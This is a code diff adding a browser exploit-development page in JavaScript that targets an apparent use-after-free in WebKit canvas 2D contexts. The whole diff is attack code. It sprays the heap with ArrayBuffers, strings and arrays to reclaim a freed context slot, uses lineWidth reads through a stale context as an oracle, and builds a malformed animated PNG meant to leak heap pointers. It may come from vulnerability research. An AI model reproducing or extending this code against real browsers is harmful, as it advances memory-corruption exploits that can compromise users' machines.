+        say('layout scan complete');
+      } else {
+        var SMB = parseInt(soffs[si2], 10);
+        var SSZ = SMB + 8, SST = SMB + 16, SLW = SST + 48;
+        try { st.setItem('v592s_i', String(si2 + 1)); } catch (e) {}
+        bks('STEST', 'i=' + si2 + ',mb=' + SMB + ',sz=' + SSZ + ',lw@' + SLW);
+
+        var spy = 900.0 + si2;   /* unique payload per candidate */
+        var snow = parseInt(PARAM.abn || '400', 10);
+        var skeep = new Array(snow);
+        for (var si3 = 0; si3 < snow; si3++) {
+          var sab = new ArrayBuffer(768);
+          var ssz = new Uint32Array(sab, SSZ, 2);
+          ssz[0] = 1; ssz[1] = 1;
+          new Float64Array(sab, SLW, 1)[0] = spy;
+          skeep[si3] = sab;
+        }
+        canvas._scan = skeep;
+
+        var srv = -1, sre = null;
+        try { srv = savedCtx.lineWidth; } catch (e) { sre = e.name; }
+        if (sre) bks('SOK', 'i=' + si2 + ',mb=' + SMB + ',ERR=' + sre);
+        else bks('SOK', 'i=' + si2 + ',mb=' + SMB + ',lw=' + srv + ',hex=' + d2hex(srv) + ',want=' + spy);
+
+        var sq = [];
+        for (var sp2 in PARAM) {
+          if (sp2 === 'i' || sp2 === 'cb') continue;
+          sq.push(sp2 + '=' + encodeURIComponent(PARAM[sp2]));
+        }
+        sq.push('i=' + (si2 + 1));
+        var snext = location.pathname + '?' + sq.join('&');
+        setTimeout(function () { try { location.replace(snext); } catch (e) {} }, 500);
+      }
+
+    } else if (OP === 'apng') {
+      /* APNG overread (V674).
+       * Create a 1x1 RGBA animated PNG claiming 3 frames but providing only 2.
+       * The decoder will read beyond the fdAT end → heap overread.
+       * getImageData returns whatever was in memory after the PNG buffer.
+       * Extract 64-bit heap addresses (if any) and store for later use.
+       */
+      var pngSig = new Uint8Array([0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A]);
+      var ihdr = new Uint8Array([
+        0x00,0x00,0x00,0x0D, 0x49,0x48,0x44,0x52, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x01,
+        0x08,0x02, 0x00,0x00,0x00, 0x90,0x77,0x53,0xDE
+      ]);
+      var actl = new Uint8Array([
+        0x00,0x00,0x00,0x08, 0x61,0x63,0x54,0x4C, 0x00,0x00,0x00,0x03, 0x00,0x00,0x00,0x00, 0x5E,0xE5,0xE6,0x81
+      ]);
+      var fct0 = new Uint8Array([
+        0x00,0x00,0x00,0x19, 0x66,0x63,0x54,0x4C, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00, 0x7D,0x8C,0x8D,0x09
+      ]);
+      var fdat0 = new Uint8Array([
+        0x00,0x00,0x00,0x0A, 0x66,0x64,0x41,0x54, 0x00,0x00,0x00,0x00, 0xFF,0xFF, 0x00,0x00,0x00,0x00
+      ]);
+      var fct1 = new Uint8Array([
+        0x00,0x00,0x00,0x19, 0x66,0x63,0x54,0x4C, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x01, 0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00, 0xAE,0x8E,0x83,0x06
+      ]);
+      var fdat1 = new Uint8Array([
+        0x00,0x00,0x00,0x0A, 0x66,0x64,0x41,0x54, 0x00,0x00,0x00,0x01, 0xFF,0xFF, 0x00,0x00,0x00,0x00
+      ]);
+      var iend = new Uint8Array([0x00,0x00,0x00,0x00, 0x49,0x45,0x4E,0x44, 0xAE,0x42,0x60,0x82]);
+
+      var totalLen = pngSig.length + ihdr.length + actl.length + fct0.length + fdat0.length + fct1.length + fdat1.length + iend.length;
+      var pngArray = new Uint8Array(totalLen);
+      var p = 0;
+      for (var i = 0; i < pngSig.length; i++) pngArray[p++] = pngSig[i];
+      for (var i = 0; i < ihdr.length; i++) pngArray[p++] = ihdr[i];
+      for (var i = 0; i < actl.length; i++) pngArray[p++] = actl[i];
+      for (var i = 0; i < fct0.length; i++) pngArray[p++] = fct0[i];
+      for (var i = 0; i < fdat0.length; i++) pngArray[p++] = fdat0[i];
+      for (var i = 0; i < fct1.length; i++) pngArray[p++] = fct1[i];
+      for (var i = 0; i < fdat1.length; i++) pngArray[p++] = fdat1[i];
+      for (var i = 0; i < iend.length; i++) pngArray[p++] = iend[i];
+
+      bks('APNGSTART', 'frames=3,provided=2');
+      var blob = new Blob([pngArray.buffer], { type: 'image/png' });
+      var url = URL.createObjectURL(blob);
+      var im = new Image();
+      im.onload = function() {
+        var cv = document.createElement('canvas');
+        cv.width = 1; cv.height = 1;
+        var ctx2 = cv.getContext('2d');
+        try {
+          var id = ctx2.getImageData(0,0,1,1);
+          var u8 = new Uint8Array(id.data);
+          bks('PNGDATA', 'rgba=' + u8.join(','));
+          var u64 = new Uint32Array(16);
+          for (var shift = 0; shift < 12; shift++) {
+            var v64 = new Float64Array(1);
+            var src = new Uint8Array(v64.buffer);
+            for (var j = 0; j < 8; j++) src[j] = u8[(shift + j) % u8.length] || 0;
+            var ptr = v64[0];
+            if (ptr > 0x1000 && ptr < 0x7fffffffffff && (ptr & 0xFFF) !== 0) {
+              bks('PNGPTR', 'shift=' + shift + ',ptr=' + ptr);
+            }
+          }
+        } catch(e) {
+          bks('PNGERR', 'err=' + e.message);
+        }
+        bks('APNGLOADED', 'ok=1');
+        URL.revokeObjectURL(url);
+      };
+      im.onerror = function() { bks('APNGERR', 'load-fail'); };
+      im.src = url + '?t=' + Date.now();
+
+    } else if (OP === 'strsweep') {
+      /* String sweep. StringImpl is allocated with WTF::fastMalloc, the same
+       * allocator family as WebCore C++ objects -- unlike JSArray butterflies,
+       * which live in JSC's auxiliary heap. A flat string is ONE allocation of
+       * sizeof(StringImpl) + len bytes whose tail bytes we fully control, so a
+       * string can reclaim the freed object slot and give us byte control.
+       *
+       * Oracle is identical to op=sweep: spray -> 24 tagged contexts -> read.
+       *   miss       -> lw = 200+i (a real context won the slot)
+       *   HIT=lw...  -> the read did not return a tagged context value
+       *   ERR=...    -> JS-level exception
+       *   no STEP    -> renderer died; last TRY is the hitting strlen
+       */
+      var slist = String(PARAM.lens || '16,24,32,40,48,56,64,72,80,96,112,128,152,176,200,232,264,296,328,360,400,448,496,560,640,768').split(',');
+      var SM2 = parseInt(PARAM.spray || '24', 10);
+      var SC2 = parseInt(PARAM.ctx || '24', 10);
+      var sallKeep = [];
+      for (var si = 0; si < slist.length; si++) {
+        var SN = parseInt(slist[si], 10);
+        if (!SN) continue;
+        bk('TRY', 'strlen=' + SN);
+
+        var sv = document.createElement('canvas');
+        sv.width = 1; sv.height = 1;
+        document.body.appendChild(sv);
+        var vinner = null;
+        var vdict = {};
+        Object.defineProperty(vdict, 'alpha', {
+          get: function () {
+            var c2 = sv.getContext('2d');
+            if (!c2) return true;
+            vinner = c2;
+            c2.lineWidth = 3.14159;
+            c2.miterLimit = 7.77;
+            for (var s3 = 0; s3 < SAVES; s3++) c2.save();
+            c2.lineWidth = 1.0;
+            return true;
+          }
+        });
+        var vbc = null;
+        try { vbc = sv.getContext('bitmaprenderer', vdict); } catch (e) {}
+        if (!vinner || !vbc) { bk('STEP', 'strlen=' + SN + ',notrigger'); continue; }
+
+        /* 1. flat strings: ~16 + SN bytes each, tail bytes are all 'A' (0x41),
+         *    so a read from inside this block yields 0x4141414141414141-ish. */
+        var sarr = new Array(SM2);
+        for (var sj = 0; sj < SM2; sj++) sarr[sj] = 'A'.repeat(SN);
+        sallKeep.push(sarr);
+
+        /* 2. tagged contexts: if one wins the slot the read returns 200+i */
+        var skk = new Array(SC2);
+        for (var sc2 = 0; sc2 < SC2; sc2++) {
+          var scv2 = document.createElement('canvas');
+          scv2.width = 1; scv2.height = 1;
+          var scx2 = null;
+          try { scx2 = scv2.getContext('2d'); } catch (e) {}
+          if (scx2) { try { scx2.lineWidth = 200 + sc2; } catch (e) {} }
+          skk[sc2] = scv2;
+        }
+        sallKeep.push(skk);
+
+        /* 3. one read */
+        var sr2 = -1, se2 = null;
+        try { sr2 = vinner.lineWidth; } catch (e) { se2 = e.name; }
+        if (se2) bk('STEP', 'strlen=' + SN + ',ERR=' + se2);
+        else if (sr2 >= 200 && sr2 < 200 + SC2) bk('STEP', 'strlen=' + SN + ',miss,ctx=' + sr2);
+        else bk('STEP', 'strlen=' + SN + ',HIT=lw' + sr2 + ',hex=' + d2hex(sr2));
+      }
+      canvas._keep = sallKeep;
+      bk('STRDONE', 'n=' + slist.length);
+
+    } else if (OP === 'tagctx') {
+      /* Same-type reclaim, but every new context gets a unique lineWidth, so
+       * the value read through the stale wrapper tells us exactly which
+       * allocation won the freed slot. */
+      var TN = parseInt(PARAM.n || '32', 10);
+      var tkeep = new Array(TN);
+      var tmade = 0;
+      for (var tk = 0; tk < TN; tk++) {
+        var tc = document.createElement('canvas');
+        tc.width = 1; tc.height = 1;
+        var tcx = null;
+        try { tcx = tc.getContext('2d'); } catch (e) {}
+        if (tcx) {
+          try { tcx.lineWidth = 100 + tmade; } catch (e) {}
+          tkeep[tmade++] = tc;
+        }
+      }
+      var tv = -1, te = null;
+      try { tv = savedCtx.lineWidth; } catch (e) { te = e.name; }
+      canvas._keep = tkeep;
+      bk('RREAD', 'tagctx n=' + TN + ',made=' + tmade + ',lw=' + tv + ',hex=' + d2hex(tv) + (te ? ',ERR=' + te : ''));
+
+    } else if (OP === 'probe') {
+      /* Size-class oracle: spray butterflies of len*8+8 bytes first, then 32
+       * real contexts tagged 4.5678, then read.
+       *   lw = 4.5678  -> butterflies did NOT take the slot (class mismatch)
+       *   no RREAD     -> butterflies DID take the slot and blocked the
+       *                   contexts (fake object deref faulted) */
+      var PN = parseInt(PARAM.spray || '32', 10);
+      var PL = parseInt(PARAM.len || '120', 10);
+      var pkeep = new Array(PN);
+      for (var ps = 0; ps < PN; ps++) {
+        var pbuf = new Array(PL);
+        for (var pj = 0; pj < PL; pj++) pbuf[pj] = 1.2345;
+        pkeep[ps] = pbuf;
+      }
+      var ckeep = new Array(32);
+      var cmade = 0;
+      for (var ck = 0; ck < 32; ck++) {
+        var cc = document.createElement('canvas');
+        cc.width = 1; cc.height = 1;
+        var ccx = null;
+        try { ccx = cc.getContext('2d'); } catch (e) {}
+        if (ccx) {
+          try {
+            ccx.lineWidth = 4.5678;
+            ccx.miterLimit = 8.88;
+          } catch (e) {}
+          ckeep[cmade++] = cc;
+        }
+      }
+      var pv = -1, pe = null;
+      try { pv = savedCtx.lineWidth; } catch (e) { pe = e.name; }
+      canvas._hold = pkeep;
+      canvas._keep = ckeep;
+      bk('RREAD', 'probe len=' + PL + ',m=' + PN + ',ctx=' + cmade + ',lw=' + pv + ',hex=' + d2hex(pv) + (pe ? ',ERR=' + pe : ''));
+
+    } else if (OP === 'sprayobj') {
+      /* Target the freed CONTEXT OBJECT slot (not the state buffer) with JS
+       * array butterflies of ~len*8+8 bytes. Marker is a real double, so a
+       * hit makes savedCtx.lineWidth read 1.2345 instead of crashing. */
+      var LN = parseInt(PARAM.len || '95', 10);
+      var M = parseInt(PARAM.spray || '64', 10);
+      var hold2 = new Array(M);
+      for (var s2 = 0; s2 < M; s2++) {
+        var arr = new Array(LN);
+        for (var j2 = 0; j2 < LN; j2++) arr[j2] = 1.2345;
+        hold2[s2] = arr;
+      }
+      var ov = 0, oe = null;
+      try { ov = savedCtx.lineWidth; } catch (e) { oe = e.name; }
+      canvas._hold = hold2;
+      bk('RREAD', 'sprayobj len=' + LN + ',m=' + M + ',lw=' + d2hex(ov) + (oe ? ',ERR=' + oe : ''));
+
+    } else if (OP === 'reclaim') {
+      /* Spray into the freed state-stack size class, keep every array alive,
+       * then read the stale state. If the read returns, reclaim worked. */
+      var hold = new Array(SPRAY_N);
+      var marker = 1.2345;
+      for (var s = 0; s < SPRAY_N; s++) {
+        var a = new Array(LEN);
+        for (var j = 0; j < LEN; j++) a[j] = marker;
+        hold[s] = a;
+      }
+      var rlw, re = null;
+      try { rlw = savedCtx.lineWidth; } catch (e) { re = e.name; }
+      bk('RREAD', 'reclaim lw=' + d2hex(rlw) + (re ? ',ERR=' + re : '') + ',len=' + LEN + ',n=' + SPRAY_N);
+      canvas._hold = hold;  /* keep butterflies alive */
+    } else {
+      bk('ERR', 'unknown-op:' + OP);
+    }
+  }
+
+  setTimeout(function () {
+    /* Release the once-guard when the run finished cleanly, so the same link
+     * can be re-run without a manual RESET. A crashing op never reaches this
+     * timer, so the guard still blocks a blind repeat of a known-crashing run
+     * (use reset=1 or guard=0 to force it). */
+    if (!GUARD_OFF && !BLOCKED) guardClear(guardKey);
+    bk('DONE', 'op=' + OP + ',len=' + LEN + ',late=' + (lateFired ? 1 : 0));
+    say('done');
+  }, 3000);
+}
+</script>
+</body></html>
